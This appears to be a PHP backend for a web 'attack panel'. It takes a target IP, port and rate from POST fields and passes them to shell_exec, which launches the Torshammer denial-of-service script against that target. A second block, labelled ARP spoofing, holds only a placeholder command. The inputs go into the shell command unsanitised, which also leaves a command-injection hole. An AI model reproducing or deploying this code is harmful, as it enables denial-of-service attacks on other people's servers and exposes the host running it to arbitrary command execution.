<?php

  // Use ls command to shell_exec
  // function
  $DDOS = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];

  if (isset($_POST['DDOS']))
  {
    print_r($DDOS);
    shell_exec($DDOS);
  }

   if(isset($_POST['DDOS-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>

<?php

  // Use ls command to shell_exec
  // function
  $ARPSPOOFING = 'xd';

  if (isset($_POST['ARPSPOOFING']))
  {
    print_r($ARPSPOOFING);
    shell_exec($ARPSPOOFING);
  }

   if(isset($_POST['ARPSPOOFING-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>
